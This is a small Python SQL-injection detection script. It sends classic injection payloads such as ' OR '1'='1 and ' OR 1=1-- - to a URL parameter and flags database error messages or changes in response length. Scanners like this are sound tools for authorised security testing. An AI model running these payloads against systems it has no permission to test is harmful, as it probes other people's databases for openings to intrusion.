import httpx

PAYLOADS = ["'", "' OR '1'='1", '" OR "1"="1', "' OR 1=1-- -"]
ERRORS = ["sql syntax", "mysql_fetch", "ora-", "sqlserver", "unclosed quotation"]

def detect(url, param, timeout=10):
    findings = []
    
    # Ignore known external error landing pages
    if "cloudflare.com" in url or "errorcode_502" in url:
        return findings

    try:
        base = httpx.get(url, params={param: "test"}, timeout=timeout)
        # Only test against endpoints that return 200 OK normally
        if base.status_code != 200:
            return findings
    except Exception:
        return findings

    for p in PAYLOADS:
        try:
            r = httpx.get(url, params={param: p}, timeout=timeout)
        except Exception:
            continue
        
        body = r.text.lower()
        if any(e in body for e in ERRORS):
            findings.append({"param": param, "payload": p, "evidence": "error signature"})
        elif r.status_code == 200 and len(r.text) != len(base.text) and p not in r.text:
            findings.append({"param": param, "payload": p,
                             "evidence": f"len delta {len(base.text)}->{len(r.text)}"})
    return findings
